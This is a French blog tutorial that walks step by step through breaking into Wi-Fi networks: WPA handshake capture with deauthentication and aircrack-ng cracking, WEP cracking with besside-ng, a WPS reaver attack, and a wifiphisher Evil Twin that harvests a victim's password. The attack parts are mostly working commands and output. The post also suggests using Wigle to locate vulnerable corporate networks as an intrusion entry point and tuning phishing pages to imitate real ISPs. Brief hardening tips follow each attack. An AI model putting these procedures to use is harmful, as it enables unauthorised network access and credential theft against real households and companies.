---
published: true
layout: post
title: "Pirater un réseau wifi sécurisé"
description: "Cet article décrit comment pirater un réseau wifi qui est sécurisé. Les méthodes pour protéger son réseau wifi d'un hacker sont également abordées."
lang: fr_FR
category: phishing,wifi,hack,cracking,bruteforce
---
![Pirater un réseau wifi sécurisé](/assets/images/2020-12-01-Pirater-un-reseau-wifi-securise/illustration.jpg)

Cet article détaillera les méthodes et les outils nécessaires afin de tenter de **compromettre la sécurité d'un réseau wifi**. Quatre types d'attaques seront détaillées :
1. Pirater un réseau wifi sécurisé par une clé WPA/WPA2 via une attaque par force brute (bruteforce)
2. Pirater un réseau wifi sécurisé par une clé WEP en exploitant la vulnérabulité liée au protocole
3. Comment pirater un réseau wifi dont le WPS est activé en exploitant la vulnérabilité PixieDust
4. Comment pirater un réseau, quelle que soit la méthode d'authentification via une attaque de phishing (Evil Twin)
5. Où se procurer le matériel pour pirater un wifi et ainsi acquérir sa propre carte ALFA Network AWUS036NHA

## 1 - Pirater un réseau wifi sécurisé par un clé WPA/WPA2 via une attaque par force brute (bruteforce)
À l'heure où j'écris cet article, **il n'existe pas de vulnérabilité qui permette de casser le chiffrement d'une connexion wifi sécurisée par WPA/WPA2**. De ce fait, la seule attaque viable est une attaque par force brute (bruteforce).
Pour se faire, l'attaquant doit récupérer la séquence d'initialisation de connexion (Handshake). Cette interception se fait lorsqu'un client se connecte au routeur cible ou point d'accès cible. Afin d'accélérer ce processus, l'attaquant peut lancer un paquet de désauthentification pour forcer le client à se déconnecter et ainsi réinitialiser une connexion.

Pour faire une telle attaque, une carte capable d'injecter des paquets et donc capable de passer en mode moniteur sera nécessaire. Le mode moniteur est un mode d'écoute, l'objectif est d'intercepter les paquets. Vous pourrez vous procurer la référence en la matière en achetant une carte **ALFA Network AWUS036NHA** qui coûte aux alentours de 24€.

*Note : Si vous utilisez votre carte Alfa sur une machine virtuelle, vous devez la voir apparaître dans `Périphérique` --> `USB`. Si aucun périphérique n'apparaît, il faut s'assurer que l'utilisateur de l'hôte soit bien dans le groupe `vboxusers`, auquel cas il faut l'ajouter via : `sudo usermod -a -G vboxusers VotreUtilisateur` (si vous êtes sous Linux) puis rédémarrer le PC.
Par ailleurs, la VM doit être configurée en mode USB 3.0.*

### 1.1 - Passage en mode moniteur de la carte réseau
Il faut s'assurer qu'elle soit bien connectée, elle devrait s'appeler `wlan0` :
```shell
/sbin/ifconfig
```
Le résultat est alors :
```shell
wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ha:ck:er:mm:aa:nn  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Il faut tuer les processus qui utilisent la carte réseau et empêcheraient le démarrage en mode moniteur.
Pour ce faire, lancer la commande :
```shell
sudo airmon-ng check kill
```
Le résultat sera alors :
```shell
PID Name
2161 wpa_supplicant
```

La commande suivante permet de passer la carte en mode moniteur :
```shell
sudo airmon-ng start wlan0
```

Le résultat est alors le suivant :
```shell
PHY     Interface       Driver          Chipset
phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 802.11n

                (mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
                (mac80211 station mode vif disabled for [phy0]wlan0)
```

### 1.2 - Récupération des paquets d'initialisation de connexion (Handshake)
C'est ici que commence la partie la plus intéressant. Via la commande suivante, le mode d'écoute va être lancé à l'aide de l'utilisateur `airodump-ng` :
```shell
sudo airodump-ng wlan0mon
```

Les réseaux voisins (BSSID) vont alors apparaître ainsi que tous les clients (périphériques) connectés. Dans cet article, le réseau `HACK-MOI-SI-TU-PEUX` va être piraté.

```shell
CH 13 ][ Elapsed: 2 mins ][ 2020-11-22 12:40

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  
VV:II:CC:TT:IM:EE  -56       84       40    0  11  195   WPA2 CCMP   PSK  HACK-MOI-SI-TU-PEUX

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
VV:II:CC:TT:IM:EE  UT:IL:IS:AT:EU:RR  -55    0e- 0e     0       33   

```

Cette commande donne une vue d'ensemble des réseaux disponibles ainsi que tous les clients qui émettent des paquets (qu'ils soient associés à un BSSID ou non).
La commande suivante va permettre de se "concentrer" sur un seul BSSID et ainsi **écouter tous les paquets à sa destination pour enregistrer les fichiers d'initialisation de connexion (Handshake)**. Un canal de wifi doit être défini ainsi que le BSSID a écouter :

```shell
sudo airodump-ng -c 11 --bssid VV:II:CC:TT:IM:EE -w output wlan0mon
```

Pour l'instant, aucune capture d'initialisation de connexion n'a été effectuée.
```shell
CH 11 ][ Elapsed: 54 s ][ 2020-11-22 12:43

BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID                   
VV:II:CC:TT:IM:EE  -49  62      443      416    2  11  195   WPA2 CCMP   PSK  HACK-MOI-SI-TU-PEUX

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
VV:II:CC:TT:IM:EE  UT:IL:IS:AT:EU:R2  -43    0 - 0      0        9
VV:II:CC:TT:IM:EE  UT:IL:IS:AT:EU:RR  -57    0e- 0      0      374
```

Sur un autre terminal toujours en écoutant le BSSID cible, un paquet de désauthentification doit être envoyé grâce à l'utilitaire `aireplay-ng` en spécifiant le BSSID cible et l'adresse MAC du client cible :
```shell
sudo aireplay-ng -0 1 -a VV:II:CC:TT:IM:EE -c UT:IL:IS:AT:EU:RR wlan0mon
```
Le résultat est le suivant :
```shell
12:52:38  Waiting for beacon frame (BSSID: VV:II:CC:TT:IM:EE) on channel 11
12:52:39  Sending 64 directed DeAuth (code 7). STMAC: [UT:IL:IS:AT:EU:RR] [10|63 ACKs]
```

Dans le terminal où l'écoute du BSSID cible est active, le paquet d'initialisation est alors récupéré, représenté par la valeur `WPA handshake: VV:II:CC:TT:IM:EE` :

```shell
CH 11 ][ Elapsed: 1 min ][ 2020-11-22 12:53 ][ WPA handshake: VV:II:CC:TT:IM:EE

BSSID              PWR RXQ  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  
VV:II:CC:TT:IM:EE  -49  71      600      562    8  11  195   WPA2 CCMP   PSK  HACK-MOI-SI-TU-PEUX

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
VV:II:CC:TT:IM:EE  UT:IL:IS:AT:EU:RR  -51    0e- 0      0      644  EAPOL
VV:II:CC:TT:IM:EE  UT:IL:IS:AT:EU:R2  -60    0e- 0      0       48
```
Les fichiers `output-01.cap`, `output-01.csv`, `output-01.kismet.csv`, `output-01.kismet.netxml`, `output-01.log.csv` sont alors apparus dans le répertoire courant. L'étape suivante est de **casser le mot de passe du réseau wifi**.

### 1.3 - Cassage du mot de passe présent dans le fichier d'initialisation de connexion (Handshake)
L'objectif est maintenant de casser le mot de passe présent ce fichier `.cap` grâce à l'utilitaire `aircrack-ng`. Une liste de mots de passe doit être passée en paramètre ou directement générée.

#### 1.3.1 - Cassage de la clé grâce à une génération de mots de passe
L'outil crunch est un générateur de mot de passe aléatoire, il prend en paramètre une longueur de mot de passe et les caractères de ce dernier et génère toutes les possibilités. Dans cet exemple, un mot de passe de 8 à 25 caractères sera généré et contiendra uniquement les valeurs de l'alphabet. Chaque mot de passe généré est passé via le pipe à `aircrack-ng` :
```shell
crunch 8 25 abcdefghijklmnopqrstuvwxy | aircrack-ng -w - -b VV:II:CC:TT:IM:EE *.cap
```
Il n'y a qu'à attendre que le **mot de passe du wifi soit cracké**. Cependant, cette méthode n'est pas la plus efficace et la méthode suivante à beaucoup plus de chances de fonctionner.

#### 1.3.2 - Cassage de la clé grâce à une liste de mots de passe prédéfinie
L'utilitaire `aircrack-ng` peut prendre en paramètre une liste de mots de passe. Le [dépôt GitHub SecList](https://github.com/danielmiessler/SecLists/blob/master/Passwords/richelieu-french-top20000.txt) en réuni un nombre conséquent et s'avère très utile dans ce cas. En effet, le point d'accès à pirater étant français dans ce cas, le "top" 20 000 des mots de passe français sera utilisé.

La commande est donc la suivante :
```shell
aircrack-ng -w richelieu-french-top20000.txt -b VV:II:CC:TT:IM:EE *.cap
```

Le fichier `.cap` est alors correctement cassé et le mot de passe en clair est visible, dans ce cas `jetaime` :
```shell
Aircrack-ng 1.6

[00:00:00] 57/59 keys tested (452.32 k/s)
Time left: 0 seconds                                      96.61%
KEY FOUND! [ jetaime ]

Master Key     : 31 B1 AC 4F DD AA BB BB CC DD EE FF GG HH AA 21
31 B1 AC 4F DD AA BB BB CC DD EE FF GG HH AA 21

Transient Key  : E7 1A E0 BB B7 06 F4 44 24 48 10 9A 33 BE 6E 03
E7 1A E0 BB B7 06 F4 44 24 48 10 9A 33 BE 6E 03
E7 1A E0 BB B7 06 F4 44 24 48 10 9A 33 BE 6E 03
84 ED FF 84 ED FF ED FF 75 ED FF 75 32 75 32 AA

EAPOL HMAC     : 24 48 10 9A 24 48 24 48 48 24 48 48 24 48 48 24
```

Note : Selon la marque du fournisseur d'accès, les points d'accès seront configurés avec une clé par défaut qui peut être trop longue pour être attaquée par force brute. Dans ce cas, il convient de relever le fournisseur en question et de se renseigner sur le schéma de mot de passe utilisé.
Par exemple, le schéma utilisé par le fournisseur *Free* pour ses *Freebox* sera :
```
<mot latin><chiffre ou caractère>-<mot latin><chiffre ou caractère>-<mot latin><chiffre ou caractère>-<mot latin><chiffre ou caractère>
```
Pour les *Bbox* fournies par *Bouygues*, les mots de passe seront des lettres en majuscules et chiffres d'une longueur de 26 à 30 caractères.

Bien sûr, ces informations ne sont pas toutes vraies pour toutes les boxes et peuvent changer au cours du temps et des modèles.

Les mots de passe par défaut sont d'une complexité respectant les standards de sécurité. De ce fait, un attaquant cherchara à s'attaquer à un routeur dont le nom a été modifié. En effet, si le nom a été modifié, il y a des grandes chances pour que le mot de passe l'ait été aussi. Il sera très probablement plus faible que celui par défaut comme le prouve le [top des mots de passe WPA cassés](https://github.com/danielmiessler/SecLists/blob/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt).

### 1.4 - Comment protéger son réseau wifi WPA/WPA2 afin d'éviter qu'un hacker le pirate
Il convient tout simplement d'utiliser le protocole WPA2 ou WPA3 ainsi qu'un un mot de passe avec des caractères spéciaux, chiffres, lettres en majuscules et minuscules. Le tout, d'une longueur de 30 caractères au minimum.
Petite astuce, de plus en plus de box utilisent les QR code pour se connecter rapidement donc un simple scan avec le smartphone permet de se connecter et donc évite d'entrer à la main un long mot de passe.

## 2 - Pirater un réseau wifi sécurisé par une clé WEP en exploitant la vulnérabulité liée au protocole
Les réseaux sécurisés par le protocole WEP (Wired Equivalent Privacy) sont de moins en moins nombreux. Ce protocole est considéré comme obsolète depuis 2004.
Grâce aux fournisseurs d'accès internet qui louent leur box internet, ces dernières sont régulièrement remplacées et donc le protocole WEP n'est plus implémenté par défaut.
Malheureusement, il arrive des cas où vous pourrez encore trouver ce genre de réseau, que ça soit chez un particulier ou dans une entreprise. Oui, il m'est arrivé durant un test d'intrusion de trouver un réseau WEP... sur le parking de l'entreprise en question :)

Selon [Wikipédia](https://fr.wikipedia.org/wiki/Wired_Equivalent_Privacy) :
> Le WEP 64 bits utilise une clé de chiffrement de 40 bits à laquelle est concaténé un vecteur d'initialisation (initialization vector ou IV en anglais) de 24 bits. WEP utilise la clé et le vecteur d'initialisation pour former une clé RC4 de 64 bits permettant de chiffrer les données échangées. Parce que RC4 est un algorithme de chiffrement par flot, la même clé ne doit pas être utilisée deux fois pour chiffrer les données échangées. C'est la raison de la présence d'un vecteur d'initialisation (IV). Ce vecteur, transmis sans protection, permet d'éviter la répétition. Cependant, un IV de 24 bits n'est pas assez long pour éviter ce phénomène sur un réseau très actif. De plus, le vecteur d'initialisation est utilisé de telle façon qu'il rend le WEP sensible à une attaque par clé apparentée.

Voici comment **exploiter la vulnérabilité liée au protocole WEP pour pirater ce réseau sécurisé**.
### 2.1 - Passage en mode moniteur de la carte réseau
Il faut s'assurer que la carte soit bien connectée, elle devrait s'appeler `wlan0` :
```shell
/sbin/ifconfig
```
Le résultat est alors :
```shell
wlan0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether ha:ck:er:mm:aa:nn  txqueuelen 1000  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

Il faut tuer les processus qui utilisent la carte réseau et empêcheraient le démarrage en mode moniteur :
Pour ce faire, lancer la commande :
```shell
sudo airmon-ng check kill
```
Le résultat sera alors :
```shell
PID Name
2161 wpa_supplicant
```

La commande suivante permet de passer la carte en mode moniteur :
```shell
sudo airmon-ng start wlan0
```

Le résultat est alors le suivant :
```shell
PHY     Interface       Driver          Chipset
phy0    wlan0           ath9k_htc       Qualcomm Atheros Communications AR9271 802.11n
(mac80211 monitor mode vif enabled for [phy0]wlan0 on [phy0]wlan0mon)
(mac80211 station mode vif disabled for [phy0]wlan0)
```

Une fois votre périphérique en mode écoute, il convient d'analyser les points d'accès qui utilisent le protocole WEP. Un filtre à la commande `airodump-ng` peut-être ajouté pour n'afficher que les point d'accès WEP.
```shell
sudo airodump-ng wlan0mon --encrypt WEP
```
Le résultat est alors le suivant :

```shell
CH 13 ][ Elapsed: 2 mins ][ 2020-11-22 12:40
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID  
VV:II:CC:TT:IM:EE  -56       84       40    0  11  195   WEP WEP   PSK  HACK-MOI-SI-TU-PEUX

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
VV:II:CC:TT:IM:EE  UT:IL:IS:AT:EU:RR  -55    0e- 0e     0       33     
```                                                                                                                                                     
L'outil utilisé sera `besside-ng`. Il faut utiliser cet outil avec précaution, car sans appliquer les paramètres nécessaires, il tentera de **cracker tous les réseaux WEP distants** et **capturera toutes les trames de connexion des réseaux WPA alentour**.

La syntaxe est la suivante: `besside-ng -b <BSSID> -c <canal> wlan0mon`.
Le BSSID est affiché dans la liste des points d'accès et le canal correspond au `CH`.
Dans ce cas, la commande sera `besside-ng -b VV:II:CC:TT:IM:EE -c 11 wlan0mon`.

Le résultat sera alors :
```shell
[18:39:34] Let's ride
[18:39:34] Appending to wpa.cap
[18:39:34] Appending to wep.cap
[18:39:34] Logging to besside.log
[18:39:35] Got replayable packet for VV:II:CC:TT:IM:EE [len 104]
[18:39:36] Associated to VV:II:CC:TT:IM:EE AID [3]
[18:39:36] | Attacking VV:II:CC:TT:IM:EE WEP - FLOOD - 478 IVs rate 101 [201 PPS out] len 104
...
...
```
La commande doit alors être la suivante pour cracker les fichiers .cap : `sudo aircrack-ng ./wep.cap`
Le résultat est alors le suivant :
```shell
Aircrack-ng 1.6
[00:00:00] 17876 keys tested (got 20212 IVs)
KEY FOUND! [ jetaime ]

Master Key     : 31 B1 AC 4F DD AA BB BB CC DD EE FF GG HH AA 21
31 B1 AC 4F DD AA BB BB CC DD EE FF GG HH AA 21

Transient Key  : 31 B1 AC 4F DD AA BB BB CC DD EE FF GG HH AA 21
51 7B 51 7B 51 7B 51 7B 51 7B 51 7B 51 7B 51 7B
AF E8 20 52 2E 2D CD AF E8 20 52 2E 2D CD AA CC
84 ED FF 84 ED FF ED FF 75 ED FF 75 32 75 32 AA

EAPOL HMAC     : 24 48 10 9A 24 48 24 48 48 24 48 48 24 48 48 24
```
Le mot de passe est alors cracké en quelques secondes/minutes selon le cas, ici : `jetaime`

### 2.2 - Comment trouver des points d'accès sécurisés par une clé WEP
Un pirate pourrait avoir envie de rechercher les réseaux wifi vulnérables autour de lui, c'est possible grâce à Wigle qui référence tous les réseaux wifi dans le monde. J'en avais déjà parlé dans mon article sur la <a href="https://clement-bouder.fr/osint,geolocalisation,powershell/2020/11/18/Comment-geolocaliser-un-pc-grace-a-powershell.html" target="https://clement-bouder.fr/osint,geolocalisation,powershell/2020/11/18/Comment-geolocaliser-un-pc-grace-a-powershell.html">géolocalisation d'un PC via PowerShell.</a>
La création d'un compte gratuit est nécessaire pour avoir accès à la [page de recherche avancée](https://wigle.net/search).
Il est alors possible de filtrer par ville, protocole de sécurité et par date de dernier référencement. Cette fonctionnalité est intéressante pour s'assurer de la fraîcheur des données et être certain que le réseau est toujours fonctionnel. Ici, une recherche est effectuée avec les critères suivants :
- Ville de Paris
- Arrondissement : 75008
- Date de dernière observation : Cette année (01/01/2020)
- Protocole de sécuisation : WEP

[![Recherche de réseaux wifi WEP vulnérables](/assets/images/2020-12-01-Pirater-un-reseau-wifi-securise/recherche-reseaux-wifi-wep-vulnerables.jpg)](/assets/images/2020-12-01-Pirater-un-reseau-wifi-securise/recherche-reseaux-wifi-wep-vulnerables.jpg)

Il est possible de trouver des réseaux de particuliers ce qui est déjà embêtant. Cependant, pire : J'ai pû trouver des **réseaux wifi vulnérables de grandes entreprises** et là c'est beaucoup plus intéressant pour débuter une APT (menace persistante avancée, Advanced Persistent Threat en anglais) qui est une attaque ciblée sur une entreprise. En effet, ce réseau vulnérable pourrait servir de **porte d'entrée sur le système d'information**.

### 2.3 - Comment protéger son réseau wifi WEP afin d'éviter qu'un hacker le pirate
Il n'y a aucun moyen de sécuriser un point d'accès sécurisé par le protocle WEP. [L'ANSSI dans son guide de recommandations de sécurité relatives aux réseaux WiFi](https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-aux-reseaux-wifi/) suggère de désactiver complètement les réseaux WEP ou de passer à WPA2/WPA3.

## 3 - Comment pirater un réseau wifi dont le WPS est activé via une attaque par force brute et vulnérabilité PixieDust
PixieDust est une vulnérablité découverte dans la fonctionnalité WPS. Cette vulnérabilité permet d'augmenter de manière significative la vitesse d'attaque par force brute du code PIN WPS.
Tout comme les autres chapitres, l'objectif de la première commande `sudo airodump-ng wlan0mon --wps` est de lancer une écoute du réseau et d'afficher les point d'accès dont le WPS est activé et déverrouillé.
Le résultat est alors le suivant et la version de WPS est visible :
```shell
CH 13 ][ Elapsed: 30 s ][ 2020-11-28 17:49
BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH WPS          ESSID
VV:II:CC:TT:II:ME  -60       11      142   11   1  130   WPA2 CCMP   PSK  1.0 LAB,PBC  HACK-MOI-SI-TU-PEUX

BSSID              STATION            PWR   Rate    Lost    Frames  Notes  Probes
(not associated)   UT:IL:IS:AT:EU:RR  -74    0 - 1      0        2         HACK-MOI-SI-TU-PEUX
```

Il est alors possible de lancer l'attaque avec l'outil [reaver](https://tools.kali.org/wireless-attacks/reaver) qui implémente l'attaque PixieDust avec l'argument `-K` mais peut également faire du brute force classique.
La commande pour lancer l'attaque est la suivante :
```shell
reaver -i wlan0mon -b VV:II:CC:TT:II:ME -v
```
Mon réseau de test n'était pas vulnérable, il ne m'a pas été possible d'exécuter correctement cette attaque.

### 3.1 - Comment protéger son réseau wifi dont le WPS est activé afin d'éviter qu'un hacker le pirate
Il n'y a aucun moyen de sécuriser un point d'accès dont le WPS est activé. [L'ANSSI dans son guide de recommandations de sécurité relatives aux réseaux WiFi](https://www.ssi.gouv.fr/guide/recommandations-de-securite-relatives-aux-reseaux-wifi/) suggère de désactiver complètement cette fonctionnalité.

## 4 - Comment pirater un réseau, quelle que soit la méthode d'authentification via une attaque de phishing (Evil Twin)

Cette méthode est différente des trois autres méthodes présentées plus haut. En effet, il ne s'agit pas de casser un mot de passe ici, mais d'utiliser une **attaque de type phishing (Evil Twin)**. Le but est de générer un réseau qui a le même nom que le réseau cible mais qui lui sera ouvert (sans mot de passe). Une fois que le client se connectera à ce dernier, une fausse page sera générée pour faire office de page d'authentification. Les informations entrées seront alors transmises à l'attaquant. Les clients légitimement connectés au vrai réseau se verront déconnectés du réseau légitime par l'attaquant grâce à l'envoi de paquets de désauthentification.

Le framework [wifiphisher](https://github.com/wifiphisher/wifiphisher) sera utilisé car il est très complet et fait toutes ces opérations de manière automatique. Une fois installé, il suffit de le lancer avec la commande :
```shell
sudo wifiphisher
```
Il faut ensuite sélectionner un point d'accès à cloner :
```shell
Options:  [Esc] Quit  [Up Arrow] Move Up  [Down Arrow] Move Down
ESSID                          BSSID            CH  PWR  ENCR      CLIENTS VENDOR      
┌─────────────────────────────────────────────────────────────────────────────────────┐  
│ HACK-MOI-SI-TU-PEUX                 VV:II:CC:TT:IM:EE 11   0%   WPA2     0  Freebox │  
│                                                                                     │  
└─────────────────────────────────────────────────────────────────────────────────────┘
```

Le choix se fait avec les touches directionnelles :

```shell
Options: [Up Arrow] Move Up  [Down Arrow] Move Down

Available Phishing Scenarios:                                                                                  
1 - Firmware Upgrade Page
  A router configuration page without logos or brands asking for WPA/WPA2 password due to a firmware upgrade. Mobile-friendly.
2 - Browser Plugin Update
  A generic browser plugin update page that can be used to serve payloads to the                          
victims.         
3 - Network Manager Connect
  The idea is to imitate the behavior of the network manager by first showing the browser's "Connection Failed" page and then displaying the victim's network manager window through the page asking for the pre-shared key.
4 - OAuth Login Page
  A free Wi-Fi Service asking for Facebook credentials to authenticate using OAuth
```

L'option choisie ici est `Firmware Upgrade Page`. Le réseau est automatiquement cloné, les paquets de désauthentification sont automatiquement envoyés. Il n'y a qu'à attendre qu'une victime se connecte sur le réseau et entre le mot de passe sur la fausse page d'authentification :

[![Recherche de réseaux wifi WEP vulnérables](/assets/images/2020-12-01-Pirater-un-reseau-wifi-securise/page-authentification-wifi-phishing.png)](/assets/images/2020-12-01-Pirater-un-reseau-wifi-securise/page-authentification-wifi-phishing.png)

Voici le résulat lorsqu'une victime entre un mot de passe. Toutes les requêtes apparaissent en clair du côté de l'attaquant et le mot de passe aussi : `wfphshr-wpa-password=jetaime`:

```shell
Extensions feed:                    | wifiphisher 1.4GIT          
DEAUTH/DISAS - UT:IL:IS:AT:EU:R1    | ESSID: HACK-MOI-SI-TU-PEUX       
DEAUTH/DISAS - UT:IL:IS:AT:EU:R2    | Channel: 6                  
DEAUTH/DISAS - UT:IL:IS:AT:EU:R3    | AP interface: wlan0         
DEAUTH/DISAS - UT:IL:IS:AT:EU:R4    | Options: [Esc] Quit         
DEAUTH/DISAS - UT:IL:IS:AT:EU:R5    |_____________________________

Connected Victims:                                                                                            
UT:IL:IS:AT:EU:R2       10.0.0.55       Unknown iOS/MacOS                                                     

HTTP requests:                                                                  
[*] POST request from 10.0.0.55 with wfphshr-wpa-password=jetaime               
[*] GET request from 10.0.0.55 for http://captive.apple.com/hotspot-detect.html
[*] GET request from 10.0.0.55 for http://captive.apple.com/hotspot-detect.html

```
Pour cet article, je n'ai pas pris le temps de personnaliser la page, il est évident que plus la page sera contextualisée, plus l'attaque aura de chances de réussir. wifiphisher permet de créer ses modules et templates. Pour une attaque réaliste, il convient de reproduire la charte graphique de la marque du fournisseur d'accès du point d'accès cible (*Free*, *Bouygues*, *Orange*...)

### 4.1 - Comment protéger se protéger d'une attaque Evil Twin
Malheureusement, il n'y a pas vraiment de solutions. Utiliser un VPN ne servirait à rien car ce dernier n'encapsulerait pas le paquet de désauthentification. Il faut garder en tête que ne pas se connecter au wifi ouvert.
Désactiver sa borne wifi et utiliser un câble Ethernet peut être une bonne solution...pour la sécurité et pour la santé :)
